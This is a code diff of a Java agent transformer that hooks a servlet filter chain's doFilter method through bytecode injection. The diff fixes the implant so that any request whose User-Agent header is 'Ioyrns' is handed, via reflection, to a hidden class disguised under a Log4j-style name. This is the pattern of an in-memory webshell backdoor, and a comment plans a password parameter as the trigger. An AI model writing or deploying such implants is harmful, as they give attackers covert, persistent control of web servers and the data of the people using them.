@@ -21,19 +21,29 @@ public class MyTransformer implements ClassFileTransformer {
             CtClass cc = pool.makeClass(new ByteArrayInputStream(classFileBuffer));
             CtMethod doFilter = cc.getDeclaredMethod("doFilter");
 
+
+            // 将如下修改为从$1中调用getParameter("pass")，如果返回值不为空，则执行if中的代码
             doFilter.insertBefore(
                     "{ " +
-                            "    javax.servlet.http.HttpServletRequest req = $1;" +
-                            "    javax.servlet.http.HttpServletResponse res = $2;" +
+                            "    System.out.println(\"into doFilter\");" +
+                            "    javax.servlet.http.HttpServletRequest req = (javax.servlet.http.HttpServletRequest)$1;" +
+                            "    javax.servlet.http.HttpServletResponse res = (javax.servlet.http.HttpServletResponse)$2;" +
                             "    String ua = req.getHeader(\"User-Agent\");" +
                             "    if (\"Ioyrns\".equalsIgnoreCase(ua)) {" +
-                            "        com.filter.Log4jConfigPdFilter log4jConfigPdFilter = " +
-                            "            com.filter.Log4jConfigPdFilter.getInstance(Thread.currentThread().getContextClassLoader());" +
-                            "        log4jConfigPdFilter.execute(req, res);" +
+                            "        try {" +
+                            "            ClassLoader cl = this.getClass().getClassLoader();" +
+                            "            System.out.println(\"ApplicationFilterChain#cl = \" + cl);;" +
+                            "            Class filterClass = Class.forName(\"com.filter.Log4jConfigPdFilter\", true, cl);" +
+                            "            java.lang.reflect.Method m = filterClass.getMethod(\"getInstance\", new Class[]{ java.lang.ClassLoader.class });" + // ✅ FIX 1
+                            "            Object obj = m.invoke(null, new Object[]{ cl });" +
+                            "            java.lang.reflect.Method exec = filterClass.getMethod(\"execute\", new Class[]{ Object.class, Object.class });" +   // ✅ FIX 2
+                            "            exec.invoke(obj, new Object[]{ req, res });" +
+                            "        } catch (Throwable t) { t.printStackTrace(); }" +
                             "        return;" +
                             "    }" +
                             "}"
             );
+
 
             System.out.println("[+] Hooked doFilter, caching Log4jConfigPdFilter instance.");
             byte[] bytecode = cc.toBytecode();
